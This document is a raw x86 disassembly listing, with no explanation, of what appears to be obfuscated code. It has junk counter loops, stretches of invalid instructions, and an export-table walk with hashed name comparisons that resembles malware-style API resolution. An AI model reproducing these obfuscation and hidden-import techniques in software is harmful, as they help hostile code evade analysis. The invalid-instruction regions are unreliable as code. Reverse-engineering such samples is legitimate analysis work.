  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [edx],edi
  40d123:	xchg   ebx,eax
  40d124:	or     cl,cl
  40d126:	stc    
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	cmp    ah,dl
  40d130:	outs   dx,DWORD PTR ds:[esi]
  40d131:	std    
  40d132:	mov    eax,DWORD PTR [ebx+0x9]
  40d135:	cmp    eax,eax
  40d137:	fisttp DWORD PTR [edx+0x9]
  40d13a:	out    0x36,al
  40d13c:	sti    
  40d13d:	adc    BYTE PTR [esp+ebp*4-0xc],ch
  40d141:	mov    eax,ds:0xbe4acdf
  40d146:	jp     0x40d185
  40d148:	inc    esi
  40d149:	add    esp,eax
  40d14b:	stos   DWORD PTR es:[edi],eax
  40d14c:	and    bl,BYTE PTR [ecx-0x278fb69b]
  40d152:	xchg   ebx,eax
  40d153:	and    dl,al
  40d155:	dec    ebp
  40d156:	jmp    0x5fbf738a
  40d15b:	or     BYTE PTR [edi],al
  40d15d:	sti    
  40d15e:	mov    eax,ds:0x3f637b24
  40d163:	enter  0xa7a0,0x4c
  40d167:	push   es
  40d168:	jmp    0x2670:0x312fb224
  40d16f:	pusha  
  40d170:	jo     0x40d16c
  40d172:	add    BYTE PTR [edi+0xebffa55],dh
  40d178:	sbb    al,bl
  40d17a:	mov    ds:0xaee2b999,al
  40d17f:	sub    al,0xfd
  40d181:	add    edi,esi
  40d183:	hlt    
  40d184:	and    dl,cl
  40d186:	cmp    edi,DWORD PTR [ecx-0x15f6d877]
  40d18c:	fsub   QWORD PTR [ecx+0x1b6011d0]
  40d192:	mov    edi,?
  40d194:	imul   DWORD PTR [eax-0x9]
  40d197:	xchg   ebp,ebx
  40d199:	and    esi,DWORD PTR [esi]
  40d19b:	and    ah,BYTE PTR [ebx]
  40d19d:	sbb    eax,0xf85da61d
  40d1a2:	jne    0x40d21b
  40d1a4:	dec    ebp
  40d1a5:	add    eax,0xb8a7d737
  40d1aa:	outs   dx,BYTE PTR ds:[esi]
  40d1ab:	scas   al,BYTE PTR es:[edi]
  40d1ac:	push   es
  40d1ad:	sbb    esp,DWORD PTR [ebx]
  40d1af:	fwait
  40d1b0:	outs   dx,BYTE PTR ds:[esi]
  40d1b1:	mov    edi,edx
  40d1b3:	pop    esp
  40d1b4:	(bad)  
  40d1b5:	sbb    eax,0xb8fbbb71
  40d1ba:	add    al,0x9
  40d1bc:	push   es
  40d1bd:	push   edx
  40d1be:	adc    eax,0xb77c5fb3
  40d1c3:	cld    
  40d1c4:	jne    0x40d1b4
  40d1c6:	sti    
  40d1c7:	or     eax,0x2f6e1718
  40d1cc:	sahf   
  40d1cd:	pop    ds
  40d1ce:	leave  
  40d1cf:	out    dx,al
  40d1d0:	(bad)  
  40d1d1:	es (bad) 
  40d1d3:	xchg   esp,eax
  40d1d4:	into   
  40d1d5:	in     al,0xe5
  40d1d7:	jp     0x40d209
  40d1d9:	or     ebx,eax
  40d1db:	dec    eax
  40d1dc:	(bad)  
  40d1dd:	push   eax
  40d1de:	push   ebp
  40d1df:	daa    
  40d1e0:	aas    
  40d1e1:	xor    BYTE PTR [edi],cl
  40d1e3:	jno    0x40d21b
  40d1e5:	mov    WORD PTR ds:0x5f4be76f,fs
  40d1eb:	int3   
  40d1ec:	pop    edi
  40d1ed:	jno    0x40d1f8
  40d1ef:	mov    ecx,es
  40d1f1:	fidiv  DWORD PTR [ebp+0x11]
  40d1f4:	cmp    esi,DWORD PTR [eax+0x39e2fb45]
  40d1fa:	sub    BYTE PTR [edi+0x521ea6fc],ah
  40d200:	sbb    eax,0x3a760633
  40d205:	or     BYTE PTR [eax+edx*4+0x2391c712],al
  40d20c:	fdiv   QWORD PTR [edx]
  40d20e:	jp     0x40d26b
  40d210:	xor    al,0x48
  40d212:	shl    DWORD PTR [edx-0x66f4cd1b],cl
  40d218:	cmp    bh,BYTE PTR [edx-0x5959b28]
  40d21e:	(bad)  
  40d21f:	sub    al,bh
  40d221:	xor    eax,0xf874434b
  40d226:	cmp    al,0x2c
  40d228:	stos   BYTE PTR es:[edi],al
  40d229:	int    0x79
  40d22b:	call   0x39:0x4fd03566
  40d232:	int    0x8
  40d234:	ror    DWORD PTR [edx-0x28],1
  40d237:	dec    eax
  40d238:	dec    edx
  40d239:	std    
  40d23a:	inc    al
  40d23c:	out    dx,eax
  40d23d:	mov    ebx,DWORD PTR [edx+ebx*8-0x57b4a5d3]
  40d244:	pop    esp
  40d245:	xchg   BYTE PTR [ebp+0x7addcba1],bl
  40d24b:	mov    ds,WORD PTR [ecx]
  40d24d:	sub    al,0x57
  40d24f:	mov    dl,0x9
  40d251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d252:	mov    bh,0xe7
  40d254:	test   DWORD PTR [esi-0x33811be],edx
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x246a8e30
  40d410:	or     al,0x6a
  40d412:	xchg   edi,eax
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3e9
  40d41c:	inc    ebp
  40d41d:	xor    eax,0x30720992
  40d422:	pushf  
  40d423:	call   0x6e3:0x90687521
  40d42a:	xor    bh,0xe9
  40d42d:	repnz add esi,DWORD PTR [ecx+0x76c66acf]
  40d434:	rol    DWORD PTR [eax-0x46ff8ca9],0xd2
  40d43b:	add    al,0xe7
  40d43d:	adc    al,0x88
  40d43f:	mov    al,0x6b
  40d441:	mov    dh,0xc7
  40d443:	and    ah,ch
  40d445:	je     0x40d3ce
  40d447:	sub    dl,BYTE PTR [edi+0x78]
  40d44a:	add    DWORD PTR [eax-0x27d2431c],esi
  40d450:	imul   esi,DWORD PTR [ebx-0x58],0x2bbe390
  40d457:	add    DWORD PTR [eax-0x6],edi
  40d45a:	das    
  40d45b:	jne    0x40d45c
  40d45d:	stos   DWORD PTR es:[edi],eax
  40d45e:	push   eax
  40d45f:	cld    
  40d460:	rol    cl,0x90
  40d463:	and    eax,ecx
  40d465:	sar    BYTE PTR [esp+eiz*8-0x33bc8073],0x64
  40d46d:	pop    ebp
  40d46e:	in     al,0x96
  40d470:	mov    bh,0x59
  40d472:	daa    
  40d473:	cmp    eax,0x8a3ceacd
  40d478:	cld    
  40d479:	xchg   esi,eax
  40d47a:	cmp    ah,BYTE PTR [edi-0x3c]
  40d47d:	push   esp
  40d47e:	rcr    al,0xa2
  40d481:	sbb    DWORD PTR ds:0x13344825,esi
  40d487:	push   ebp
  40d488:	mov    ds:0xb6cbc4bd,al
  40d48d:	jge    0x40d45f
  40d48f:	mov    eax,0xec299ea2
  40d494:	ds jns 0x40d44e
  40d497:	aam    0xf0
  40d499:	jle    0x40d4fd
  40d49b:	mov    ebx,0x6bb8044a
  40d4a0:	das    
  40d4a1:	xchg   ebx,eax
  40d4a2:	hlt    
  40d4a3:	mov    eax,ds:0x48f0b728
  40d4a8:	mov    ch,0x5
  40d4aa:	dec    esi
  40d4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ac:	lods   eax,DWORD PTR ds:[esi]
  40d4ad:	jae    0x40d4ec
  40d4af:	jo     0x40d470
  40d4b1:	xchg   ebp,eax
  40d4b2:	dec    eax
  40d4b3:	cli    
  40d4b4:	jne    0x40d4f1
  40d4b6:	jg     0x40d442
  40d4b8:	es jg  0x40d4a8
  40d4bb:	adc    eax,0x2dc62c3e
  40d4c0:	sub    al,0x82
  40d4c2:	xlat   BYTE PTR ds:[ebx]
  40d4c3:	push   ebx
  40d4c4:	or     DWORD PTR gs:[edi+0x5f53c824],edi
  40d4cb:	mov    al,ds:0xbbdb4dc9
  40d4d0:	xlat   BYTE PTR ds:[ebx]
  40d4d1:	repz push cs
  40d4d3:	jmp    0xd0c967dd
  40d4d8:	pop    eax
  40d4d9:	mov    dh,dl
  40d4db:	pop    ebp
  40d4dc:	scas   eax,DWORD PTR es:[edi]
  40d4dd:	and    ch,BYTE PTR [ebx]
  40d4df:	push   ss
  40d4e0:	cwde   
  40d4e1:	xlat   BYTE PTR ds:[ebx]
  40d4e2:	pushf  
  40d4e3:	cld    
  40d4e4:	adc    al,0x7c
  40d4e6:	mov    bh,0x9a
  40d4e8:	(bad)  
  40d4e9:	imul   DWORD PTR [edx]
  40d4eb:	cmp    BYTE PTR [eax-0x22],cl
  40d4ee:	shl    BYTE PTR [eax+0x321aedc6],cl
  40d4f4:	jo     0x40d4f9
  40d4f6:	pop    ecx
  40d4f7:	ds (bad) 
  40d4f9:	sbb    al,0x72
  40d4fb:	ja     0x40d550
  40d4fd:	push   esi
  40d4fe:	pop    ecx
  40d4ff:	(bad)  
  40d500:	out    dx,al
  40d501:	js     0x40d50b
  40d503:	je     0x40d496
  40d505:	xor    DWORD PTR [ebp+0x40],edi
  40d508:	sub    al,0x1
  40d50a:	fs push edi
  40d50c:	pop    es
  40d50d:	or     al,0x7
  40d50f:	ret    0x117
  40d512:	in     eax,dx
  40d513:	(bad)  
  40d516:	and    BYTE PTR [eax],al
  40d518:	xchg   esi,eax
  40d519:	pushf  
  40d51a:	popf   
  40d51b:	lods   eax,DWORD PTR ds:[esi]
  40d51c:	jp     0x40d4da
  40d51e:	adc    DWORD PTR [ecx+0x53],ebp
  40d521:	pop    ebp
  40d522:	jns    0x40d541
  40d524:	sahf   
  40d525:	xchg   ebx,eax
  40d526:	les    ebx,FWORD PTR [esi]
  40d528:	and    cl,BYTE PTR [edx-0x66]
  40d52b:	into   
  40d52c:	mov    ecx,0x6e49953b
  40d531:	jb     0x40d52b
  40d533:	imul   edi,ebx,0x96ea317f
  40d539:	jae    0x40d4bb
  40d53b:	hlt    
  40d53c:	adc    ebx,eax
  40d53e:	je     0x40d536
  40d540:	xchg   ebp,eax
  40d541:	push   ss
  40d542:	lea    esi,[edi+0xe]
  40d545:	fist   DWORD PTR [edx-0x17f38a01]
  40d54b:	sbb    DWORD PTR [ecx-0x1],ebx
  40d54e:	dec    DWORD PTR [ebx+0x4d8bfc45]
  40d554:	clc    
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	daa    
  40d5b8:	data16 sub al,0xa7
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5e1
  40d5c4:	ins    DWORD PTR es:[edi],dx
  40d5c5:	push   ebx
  40d5c6:	lock and ebx,ebp
  40d5c9:	ficomp DWORD PTR [ecx+0x58]
  40d5cc:	int    0x4e
  40d5ce:	sub    ah,BYTE PTR [eax+0x31]
  40d5d1:	jmp    0x40d56a
  40d5d3:	cs xor al,0xa0
  40d5d6:	scas   eax,DWORD PTR es:[edi]
  40d5d7:	and    DWORD PTR [edx+0x170d4217],ebx
  40d5dd:	out    dx,al
  40d5de:	imul   ecx,DWORD PTR [ebx-0x6e595676],0x4e6ac247
  40d5e8:	lea    ebp,[eax+eiz*1-0x13]
  40d5ec:	jne    0x40d587
  40d5ee:	jmp    0xcb7d87c1
  40d5f3:	je     0x40d5f0
  40d5f5:	pusha  
  40d5f6:	loope  0x40d5dc
  40d5f8:	or     DWORD PTR [edx-0x4b],ecx
  40d5fb:	test   eax,0x4149394e
  40d600:	popa   
  40d601:	sbb    cl,0x1c
  40d604:	xchg   ebp,eax
  40d605:	int    0x8a
  40d607:	xchg   BYTE PTR [ebp+0x4e8b3d1d],bl
  40d60d:	cmp    BYTE PTR [esp+ebx*4-0x75],0x83
  40d612:	int    0x10
  40d614:	int3   
  40d615:	sbb    ch,BYTE PTR [ebp+0x54]
  40d618:	loope  0x40d68f
  40d61a:	jp     0x40d674
  40d61c:	mov    edx,0xa5497167
  40d621:	mov    esp,0xaa6b8219
  40d626:	mov    cl,cl
  40d628:	or     eax,0x328798f4
  40d62d:	imul   BYTE PTR [edx+0x7182caeb]
  40d633:	and    eax,0x1cee1721
  40d638:	stos   DWORD PTR es:[edi],eax
  40d639:	popf   
  40d63a:	sti    
  40d63b:	and    DWORD PTR [edx-0x10b26703],esp
  40d641:	fdivr  DWORD PTR [edi]
  40d643:	add    al,0xbc
  40d645:	ficom  DWORD PTR [eax-0x36]
  40d648:	cwde   
  40d649:	xchg   DWORD PTR [edx],esi
  40d64b:	sahf   
  40d64c:	inc    edx
  40d64d:	into   
  40d64e:	fisubr WORD PTR [ecx]
  40d650:	or     eax,0x1b01baf4
  40d655:	mov    dh,0x5b
  40d657:	(bad)  
  40d658:	sub    dl,ch
  40d65a:	ret    0x7e3a
  40d65d:	dec    esi
  40d65e:	shr    DWORD PTR [esi+0x3b],cl
  40d661:	jg     0x40d623
  40d663:	jno    0x40d65d
  40d665:	cmp    al,0x10
  40d667:	pop    ss
  40d668:	jbe    0x40d626
  40d66a:	mov    eax,0x3d78fcae
  40d66f:	jb     0x40d6a9
  40d671:	(bad)  
  40d672:	push   ebp
  40d673:	push   cs
  40d674:	mov    DWORD PTR ds:0xf23831b1,ecx
  40d67a:	push   0x6138c0c2
  40d67f:	mov    al,BYTE PTR [esi+0x56]
  40d682:	loop   0x40d6db
  40d684:	loop   0x40d6d9
  40d686:	rol    BYTE PTR [ebx+eax*1+0xd],0x46
  40d68b:	clc    
  40d68c:	push   eax
  40d68d:	mov    edi,0x8c3ff46
  40d692:	loop   0x40d688
  40d694:	in     al,0x38
  40d696:	pushf  
  40d697:	mov    ebx,0x8c34a1a1
  40d69c:	fild   QWORD PTR [ecx]
  40d69e:	lea    edx,[ebp+0x61]
  40d6a1:	loop   0x40d6b6
  40d6a3:	fidiv  DWORD PTR [edx+edx*8]
  40d6a6:	cli    
  40d6a7:	ins    BYTE PTR es:[edi],dx
  40d6a8:	rcr    BYTE PTR [ecx+0x406aa455],0xdf
  40d6af:	aas    
  40d6b0:	nop
  40d6b1:	dec    esp
  40d6b2:	sar    dh,0xb3
  40d6b5:	jb     0x40d6f7
  40d6b7:	pop    ecx
  40d6b8:	jns    0x40d705
  40d6ba:	hlt    
  40d6bb:	jmp    0x40d6e6
  40d6bd:	sub    dl,BYTE PTR [ebp-0x6c]
  40d6c0:	hlt    
  40d6c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c2:	outs   dx,BYTE PTR ds:[esi]
  40d6c3:	fild   QWORD PTR [edx+0x1b]
  40d6c6:	sub    bl,BYTE PTR [edx-0x57aeec5a]
  40d6cc:	and    ebx,DWORD PTR [eax]
  40d6ce:	(bad)  
  40d6d0:	mov    ah,0xf0
  40d6d2:	mov    al,0x44
  40d6d4:	ja     0x40d722
  40d6d6:	jns    0x40d701
  40d6d8:	arpl   WORD PTR [ebp-0x61],sp
  40d6db:	push   edi
  40d6dc:	xchg   edi,eax
  40d6dd:	into   
  40d6de:	inc    esi
  40d6df:	iret   
  40d6e0:	inc    ecx
  40d6e1:	enter  0x2b0d,0x8e
  40d6e5:	jno    0x40d6f2
  40d6e7:	and    ch,0xcc
  40d6ea:	cmp    al,0x70
  40d6ec:	outs   dx,BYTE PTR ds:[esi]
  40d6ed:	idiv   bl
  40d6ef:	mov    eax,DWORD PTR [ebp-0x4]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
